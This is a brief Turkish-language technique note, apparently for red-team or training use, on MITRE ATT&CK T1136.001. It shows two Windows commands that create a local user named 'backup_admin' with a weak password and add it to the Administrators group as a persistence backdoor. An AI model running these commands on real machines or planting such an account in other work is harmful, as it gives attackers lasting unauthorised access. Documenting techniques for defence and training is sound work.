# Gizli Yerel Yönetici (Persistence - T1136.001)

İlk erişimi sağladıktan sonra saldırgan, ele geçirilen makinede kalıcılık sağlamak için yeni bir yerel kullanıcı hesabı oluşturur ve bunu Administrators (Yöneticiler) grubuna ekler.

## Uygulama (Windows Komut Satırı)
Yetkili bir komut satırı kullanarak, arka kapı (backdoor) hesabı oluşturmak için `net user` ve `net localgroup` komutlarını çalıştırdım.

1. 'backup_admin' adında yeni bir kullanıcı oluştur
```cmd
net user backup_admin Password123! /add
```
2. Kullanıcıyı yerel Administrators grubuna ekle
```cmd
net localgroup Administrators backup_admin /add
```